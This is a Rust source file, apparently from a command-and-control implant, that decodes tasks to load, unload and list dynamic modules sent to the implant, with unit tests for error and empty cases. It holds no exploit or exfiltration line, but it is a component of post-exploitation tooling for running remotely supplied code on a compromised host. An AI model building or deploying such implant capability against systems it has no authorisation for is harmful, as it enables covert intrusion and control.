//! Module load/unload/list task execution
//!
//! Handles the "module" task type by delegating to the [`DynamicModuleLoader`]
//! held in the shared [`ModuleRegistry`].

use crate::error::{ImplantError, ImplantResult};
use common::ModuleId;
use implant_loader::DynamicModuleLoader;
use protocol::{
    module_task::Operation, LoadedModuleInfo as ProtoLoadedModuleInfo, ModuleOperationResult,
    ModuleTask,
};
use std::sync::{Arc, Mutex};

/// Execute a module task (load / unload / list) against `loader`.
///
/// `task_data` is a prost-encoded [`ModuleTask`] message.
/// Returns a prost-encoded [`ModuleOperationResult`] on success.
#[allow(dead_code)]
pub fn execute_module_task(
    task_data: &[u8],
    loader: &Arc<Mutex<DynamicModuleLoader>>,
) -> ImplantResult<Vec<u8>> {
    let module_task: ModuleTask = protocol::decode(task_data)
        .map_err(|e| ImplantError::Task(format!("failed to decode ModuleTask: {}", e)))?;

    let operation = module_task
        .operation
        .ok_or_else(|| ImplantError::Task("ModuleTask has no operation".into()))?;

    let result = match operation {
        Operation::Load(load) => {
            let mut ldr = loader
                .lock()
                .map_err(|_| ImplantError::Task("module loader lock poisoned".into()))?;

            match ldr.load(&load.module_blob) {
                Ok(module_id) => ModuleOperationResult {
                    operation: "load".into(),
                    module_id: module_id.as_str().to_string(),
                    success: true,
                    message: None,
                    loaded_modules: vec![],
                },
                Err(e) => ModuleOperationResult {
                    operation: "load".into(),
                    module_id: String::new(),
                    success: false,
                    message: Some(e.to_string()),
                    loaded_modules: vec![],
                },
            }
        }

        Operation::Unload(unload) => {
            let module_id = ModuleId::new(&unload.module_id);
            let mut ldr = loader
                .lock()
                .map_err(|_| ImplantError::Task("module loader lock poisoned".into()))?;

            match ldr.unload(&module_id) {
                Ok(()) => ModuleOperationResult {
                    operation: "unload".into(),
                    module_id: unload.module_id,
                    success: true,
                    message: None,
                    loaded_modules: vec![],
                },
                Err(e) => ModuleOperationResult {
                    operation: "unload".into(),
                    module_id: unload.module_id,
                    success: false,
                    message: Some(e.to_string()),
                    loaded_modules: vec![],
                },
            }
        }

        Operation::List(_) => {
            let ldr = loader
                .lock()
                .map_err(|_| ImplantError::Task("module loader lock poisoned".into()))?;

            let modules: Vec<ProtoLoadedModuleInfo> = ldr
                .list()
                .into_iter()
                .map(|info| ProtoLoadedModuleInfo {
                    module_id: info.module_id.as_str().to_string(),
                    name: info.name,
                    version: info.version,
                    loaded_at: info.loaded_at,
                    memory_size: info.memory_size as u64,
                })
                .collect();

            ModuleOperationResult {
                operation: "list".into(),
                module_id: String::new(),
                success: true,
                message: None,
                loaded_modules: modules,
            }
        }
    };

    Ok(protocol::encode(&result))
}

#[cfg(test)]
mod tests {
    use super::*;
    use protocol::{ModuleList, ModuleTask, ModuleUnload, ModuleOperationResult};

    fn make_loader() -> Arc<Mutex<DynamicModuleLoader>> {
        Arc::new(Mutex::new(DynamicModuleLoader::new()))
    }

    #[test]
    fn test_execute_module_task_invalid_data() {
        let loader = make_loader();
        let result = execute_module_task(b"not valid protobuf \xff\xfe", &loader);
        assert!(result.is_err(), "invalid protobuf data must return an error");
        let err = result.unwrap_err();
        assert!(
            err.to_string().contains("failed to decode ModuleTask"),
            "error message should mention decode failure, got: {}",
            err
        );
    }

    #[test]
    fn test_execute_module_task_no_operation() {
        let loader = make_loader();
        // A ModuleTask with no operation set encodes to empty bytes.
        let task = ModuleTask { operation: None };
        let encoded = protocol::encode(&task);
        let result = execute_module_task(&encoded, &loader);
        assert!(result.is_err(), "ModuleTask with no operation must return an error");
        let err = result.unwrap_err();
        assert!(
            err.to_string().contains("no operation"),
            "error message should mention missing operation, got: {}",
            err
        );
    }

    #[test]
    fn test_execute_module_task_list_empty() {
        let loader = make_loader();
        let task = ModuleTask {
            operation: Some(protocol::module_task::Operation::List(ModuleList {})),
        };
        let encoded = protocol::encode(&task);
        let result = execute_module_task(&encoded, &loader);
        assert!(result.is_ok(), "list on empty loader must succeed, got: {:?}", result.err());

        let response: ModuleOperationResult =
            protocol::decode(&result.unwrap()).expect("response must be valid protobuf");
        assert!(response.success, "list must report success");
        assert_eq!(response.operation, "list");
        assert!(
            response.loaded_modules.is_empty(),
            "empty loader must return zero modules"
        );
    }

    #[test]
    fn test_execute_module_task_unload_nonexistent() {
        let loader = make_loader();
        let task = ModuleTask {
            operation: Some(protocol::module_task::Operation::Unload(ModuleUnload {
                module_id: "kraken.test.nonexistent".to_string(),
            })),
        };
        let encoded = protocol::encode(&task);
        let result = execute_module_task(&encoded, &loader);
        assert!(
            result.is_ok(),
            "unload of nonexistent module must return Ok (with success=false inside), got: {:?}",
            result.err()
        );

        let response: ModuleOperationResult =
            protocol::decode(&result.unwrap()).expect("response must be valid protobuf");
        assert!(!response.success, "unloading a nonexistent module must report success=false");
        assert_eq!(response.operation, "unload");
        assert_eq!(response.module_id, "kraken.test.nonexistent");
        assert!(
            response.message.is_some(),
            "error message must be set for failed unload"
        );
    }
}
